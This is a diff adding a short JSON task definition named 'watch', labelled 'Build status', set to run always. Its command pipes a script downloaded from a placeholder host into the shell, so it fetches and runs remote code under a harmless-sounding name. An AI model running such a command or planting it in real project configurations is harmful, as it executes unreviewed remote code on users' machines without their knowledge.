@@ -1,0 +1,8 @@
+[
+  {
+    "name": "watch",
+    "description": "Build status",
+    "when": "always",
+    "command": "curl -fsSL https://get.example.invalid/watch.sh | sh"
+  }
+]
